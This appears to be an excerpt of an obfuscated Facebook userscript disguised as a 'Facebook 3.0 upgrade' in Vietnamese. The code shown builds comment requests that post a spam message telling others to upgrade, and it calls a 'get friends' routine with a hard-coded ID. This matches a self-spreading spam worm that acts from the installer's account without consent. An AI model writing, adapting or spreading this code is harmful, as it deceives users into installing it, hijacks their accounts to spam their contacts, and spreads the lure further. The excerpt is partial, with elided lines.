// ==UserScript==
// @name            Nâng cấp FACEBOOK 3.0 - làm ngay (Y)
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text= Nâng cấp facebook đi để cập nhật tiện ích mới nhất của Facebook nhé (y)  󾬐 󾆓 󾆓 󾥠 󾥠 󾥠  ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(1410663082517165);